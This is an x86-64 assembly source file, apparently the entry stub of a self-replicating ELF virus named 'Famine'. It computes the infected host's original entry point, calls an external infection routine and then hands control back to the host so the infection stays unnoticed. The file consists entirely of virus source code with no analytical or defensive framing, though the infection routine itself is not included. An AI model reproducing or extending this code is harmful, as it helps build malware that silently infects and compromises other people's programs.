global _start:function
global signature:data
extern famine
section .text

%define SYSCALL_EXIT 60

exit:
			mov rax, SYSCALL_EXIT
			mov rdi, 0
			syscall

_start:
			push rdi
			push rsi
			push rcx
			push rdx
	.findEntryAddress:
        ; Get host entry
            lea rax, [rel _start]
            sub rax, [rel payloadOffset]
            add rax, [rel hostOffset]
            push rax
	.callFamine:
			call famine
	.jumpToEntry:
			pop rax
			pop rdx
			pop rcx
			pop rsi
			pop rdi
			jmp rax

data:
	signature: db "Famine v1.0 (c)oded by tblaudez", 0x0
    payloadOffset: dq _start
    hostOffset: dq exit